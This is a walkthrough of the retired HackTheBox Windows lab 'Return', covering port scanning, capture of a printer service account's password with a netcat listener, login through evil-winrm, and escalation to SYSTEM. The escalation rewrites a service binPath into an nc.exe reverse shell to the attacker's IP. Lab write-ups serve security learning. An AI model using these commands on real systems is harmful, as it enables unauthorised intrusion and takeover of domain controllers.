# Return
## HackTheBox
### Easy (Retired)

### NMAP
```
PORT      STATE SERVICE       REASON          VERSION
 * 53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
 * 53/udp    open          domain         udp-response ttl 127 (generic dns response: SERVFAIL)
    fingerprint-strings:
  NBTStat:
    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 * 80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
    http-server-header: Microsoft-IIS/10.0
    http-methods:
      Supported Methods: OPTIONS TRACE GET HEAD POST
      Potentially risky methods: TRACE
    http-title: HTB Printer Admin Panel
 * 88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-10-13 17:14:10Z)
 * 135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 135/udp   open|filtered msrpc
 * 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
 * 389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows LDAP (Domain: return.local0., Site: Default-First-Site-Name)
 * 389/udp   open  ldap          udp-response ttl 127 Microsoft Windows Active Directory LDAP
     (Domain: return.local0., Site: Default-First-Site-Name)
 * 445/tcp   open  microsoft-ds? syn-ack ttl 127
 * 464/tcp   open  kpasswd5?     syn-ack ttl 127
 * 464/udp   open|filtered                       kpasswd5       no-response
 * 593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
 * 3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
 * 5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    http-server-header: Microsoft-HTTPAPI/2.0
    http-title: Not Found
 * 9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
 * 47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    http-title: Not Found
    http-server-header: Microsoft-HTTPAPI/2.0
 * 49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
 * 49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 * 49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (90%)
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
  smb2-time:
    date: 2021-10-13T17:15:12
    start_date: N/A
 smb2-security-mode:
  3.1.1:
    Message signing enabled and required
```

### Directories
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.241
 🚀  Threads               │ 100
 📖  Wordlist              │ /Volumes/TerraRyzing/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💲  Extensions            │ [php, html, js, txt]
──────────────────────────────────────────────────
301        2l       10w      151c http://10.129.95.241/images
200     1345l     2796w    28274c http://10.129.95.241/index.php
301        2l       10w      151c http://10.129.95.241/Images
200     1345l     2796w    28274c http://10.129.95.241/Index.php
200     1376l     2855w    29090c http://10.129.95.241/settings.php
301        2l       10w      151c http://10.129.95.241/IMAGES
200     1345l     2796w    28274c http://10.129.95.241/INDEX.php
200     1376l     2855w    29090c http://10.129.95.241/SETTINGS.php

### Settings.php
Requests the following:
* Server Address 	
* Server Port 	
* Username 	
* Password

### Enum4Linux
* Enumerated shares and found this:
```
 ====================================================
|    Domain Information via RPC for 10.129.95.241    |
 ====================================================
[+] Domain: RETURN
[+] SID: S-1-5-21-3750359090-2939318659-876128439
[+] Host is part of a domain (not a workgroup)
```
No dice here. Going back to the website...

### Exploiting settings.php
 * set up a netcat listner on port 389 (where tcp & udp are generally sent for LDAP)
 * entered tun0 address and port 389 in settings.php

Got some strange output:
```Console
0*`%return\svc-printer�
0*`%return\svc-printer�
0*`%return\svc-printer�
0*`%return\svc-printer�1edFg43012!!
                       1edFg43012!!
```
Possible username: svc-printer
Possible password: 1edFg43012!!

Acheived shell access with:
`evil-winrm -i $IP -u svc-printer -p '1edFg43012!!'`

Located `user.txt` at `C:\Users\svc-printer\Desktop\user.txt`

User flag: `073*****************************`

### Privilege Escalation
```Console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/13/2021 12:25:27 PM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

**Focusing on Local Group Memberships:**
 * Print Operators
 * Remote Management Users
 * Server Operators

According to [this page in the Microsoft docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

Group compatibilities:
|--------------------------|---------------------|------------------------|---------------------|--------------------------|
| **Default Security Group | Windows Server 2016 | Windows Server 2012 R2 | Windows Server 2012 | Windows Server 2008 R2** |
|--------------------------|---------------------|------------------------|---------------------|--------------------------|
| Print Operators          | Yes                 | Yes                    | Yes                 | Yes                      |
|--------------------------|---------------------|------------------------|---------------------|--------------------------|
| Remote Management Users  | Yes                 | Yes                    | Yes                 | No                       |
|--------------------------|---------------------|------------------------|---------------------|--------------------------|
| Server Operators         | Yes                 | Yes                    | Yes                 | Yes                      |
|--------------------------|---------------------|------------------------|---------------------|--------------------------|

Group information:
|--------------------------|--------------------------------------------------------------------------------------------------------------|
| Group                    | Description 						                                                  |
|--------------------------|--------------------------------------------------------------------------------------------------------------|
| Print Operator           | * manage, create, share, and delete printers connected to domain controllers in the domain                   |
|                          | * Manage Active Directory printer objects in the domain.                                                     |
|                          | * locally sign in to & shut down domain controllers in the domain.                                           |
|                          | * Has no default members.                                                                                    |
|                          | * members of this group can load and unload device drivers on all domain controllers in the domain           |
|                          | * add users with caution. This group cannot be renamed, deleted, or moved.                                   |
|                          | *See [Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)*
|--------------------------|--------------------------------------------------------------------------------------------------------------|
| Remote Management User   | * can access WMI resources over management protocols                                                         |
|                          |   * i.e., WS-Management via the Windows Remote Management service                                            |
|                          |   * This applies only to WMI namespaces that grant access to the user.                                       |
|                          | * generally used to allow users to manage servers through the Server Manager console                         |
|                          | *See [Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators) for more information*
|--------------------------|--------------------------------------------------------------------------------------------------------------|
| Server Operator          | * administer domain controllers                                                                              |
|                          | * exists only on domain controllers (By default, the group has no members.)                                  |
|                          | * sign in to a server interactively                                                                          |
|                          |   * create and delete network shared resources                                                               |
|                          |   * start and stop services                                                                                  |
|                          |   * back up and restore files                                                                                |
|                          |   * format the hard disk drive of the computer                                                               |
|                          |   * shut down the computer                                                                                   |
|                          | * has no default members.                                                                                    |
|                          | * has access to server configuration options on domain controllers                                           |
|                          | * membership controlled by these groups:                                                                     |
|                          |   * service administrator groups                                                                             |
|                          |   * Administrators and Domain Admins in the domain                                                           |
|                          |   * Enterprise Admins group in the forest root domain                                                        | 
|                          | * cannot change any administrative group memberships.                                                        |
|                          | * This security group has not changed since Windows Server 2008.                                             |
|                          | *See [Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)*
|--------------------------|--------------------------------------------------------------------------------------------------------------|

**Print Operators**
| Attribute                    | Value                                                   |
|------------------------------|---------------------------------------------------------|
| Well-Known SID/RID           | S-1-5-32-550                                            |
|------------------------------|---------------------------------------------------------|
| Type                         | Builtin Local                                           |
|------------------------------|---------------------------------------------------------|
| Default container            | CN=Builtin, DC=<domain>, DC=                            |
|------------------------------|---------------------------------------------------------|
| Default members              | None                                                    |
|------------------------------|---------------------------------------------------------|
| Default member of            | None                                                    |
|------------------------------|---------------------------------------------------------|
| Protected by ADMINSDHOLDER?  | Yes                                                     |
|------------------------------|---------------------------------------------------------|
| Safe to move out of default  |                                                         |
| container?                   | Cannot be moved                                         |
|------------------------------|---------------------------------------------------------|
| Safe to delegate management  |                                                         |
| of this group to non-service |                                                         |
| admins?                      | No                                                      |
|------------------------------|---------------------------------------------------------|
| Default User Rights          | Allow log on locally: SeInteractiveLogonRight           |
|                              | Load and unload device drivers: SeLoadDriverPrivilege   |
|                              | Shut down the system: SeShutdownPrivilege               |
|------------------------------|---------------------------------------------------------|

**Remote Management User**
|------------------------------|---------------------------------------------------------|
| Attribute                    | Value                                                   |
|------------------------------|---------------------------------------------------------|
| Well-Known SID/RID           | S-1-5-32-580                                            |
|------------------------------|---------------------------------------------------------|
| Type                         | Builtin Local                                           |
|------------------------------|---------------------------------------------------------|
| Default container            | CN=Builtin, DC=<domain>, DC=                            |
|------------------------------|---------------------------------------------------------|
| Default members              | None                                                    |
|------------------------------|---------------------------------------------------------|
| Default member of            | None                                                    |
|------------------------------|---------------------------------------------------------|
| Protected by ADMINSDHOLDER?  | No                                                      |
|------------------------------|---------------------------------------------------------|
| Safe to move out of default  |                                                         |
| container?                   | Cannot be moved                                         |
|------------------------------|---------------------------------------------------------|
| Safe to delegate management  |                                                         |
| of this group to non-service |                                                         |
| admins?                      |                                                         |
|------------------------------|---------------------------------------------------------|
| Default User Rights          | None                                                    |
|------------------------------|---------------------------------------------------------|

**Server Operator**
|------------------------------|-----------------------------------------------------------------------------------|
| Attribute                    | Value                                                                             |
|------------------------------|-----------------------------------------------------------------------------------|
| Well-Known SID/RID           | S-1-5-32-549                                                                      |
|------------------------------|-----------------------------------------------------------------------------------|
| Type                         | Builtin Local                                                                     |
|------------------------------|-----------------------------------------------------------------------------------|
| Default container            | CN=Builtin, DC=<domain>, DC=                                                      |
|------------------------------|-----------------------------------------------------------------------------------|
| Default members              | None                                                                              |
|------------------------------|-----------------------------------------------------------------------------------|
| Default member of            | None                                                                              |
|------------------------------|-----------------------------------------------------------------------------------|
| Protected by ADMINSDHOLDER?  | Yes                                                                               |
|------------------------------|-----------------------------------------------------------------------------------|
| Safe to move out of default  |                                                                                   |
| container?                   | Cannot be moved                                                                   |
|------------------------------|-----------------------------------------------------------------------------------|
| Safe to delegate management  |                                                                                   |
| of this group to non-service |                                                                                   |
| admins?                      | No                                                                                |
|------------------------------|-----------------------------------------------------------------------------------|
| Default User Rights          | Allow log on locally: SeInteractiveLogonRight                                     |
|                              | Back up files and directories: SeBackupPrivilege                                  |
|                              | Change the system time: SeSystemTimePrivilege                                     |
|                              | Change the time zone: SeTimeZonePrivilege                                         |
|                              | Force shutdown from a remote system: SeRemoteShutdownPrivilege                    |
|                              | Restore files and directories: Restore files and directories SeRestorePrivilege   |
|                              | Shut down the system: SeShutdownPrivilege                                         |
|------------------------------|-----------------------------------------------------------------------------------|

Long story short: We can stop and start services and modify its path with the current access 
 * uploaded a copy of `nc.exe`
 * Run this command:
 * sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.29 4242" 

```Console
C:\Windows\system32>whoami
whoami
nt authority\system
```
You have to move quicly as the service tends to give the following error after a minute or so:
```Console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Found `root.txt`
```Console
C:\Users\Administrator\Desktop>type root.txt
ba5*****************************
```
